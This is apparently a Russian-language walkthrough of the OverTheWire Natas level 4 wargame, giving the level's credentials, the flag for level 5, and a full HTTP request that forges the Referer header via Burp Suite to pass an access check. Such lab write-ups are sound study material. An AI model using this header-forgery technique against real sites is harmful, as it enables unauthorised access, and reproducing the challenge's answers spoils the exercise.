# Natas 4
<kbd>Username</kbd> natas4

<kbd>Password</kbd> QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

<kbd>Flag</kbd> 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

Как только логинимся, то видим что нам доступ запрещён и что авторизированные пользователи логинятся с natas5.
Открываем средства разработчка (F12) и смотрим в Network. Там видим несколько HTTP-запросов с кодом 200 и один с 404.

Открываем burp suit, затем просматриваем запросы, после берём любой и оправляем в repeater, где его немного изменяем.
Конечный результат таков:
>GET / HTTP/1.1
>
>Host: natas4.natas.labs.overthewire.org
>
>Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
>
>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
>
>Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
>
>Referer: http://natas5.natas.labs.overthewire.org/>
>
>Accept-Encoding: gzip, deflate, br
>
>Accept-Language: en-US,en;q=0.9
>
>Connection: close

По итогу нам дают флаг который является паролем для natas 5.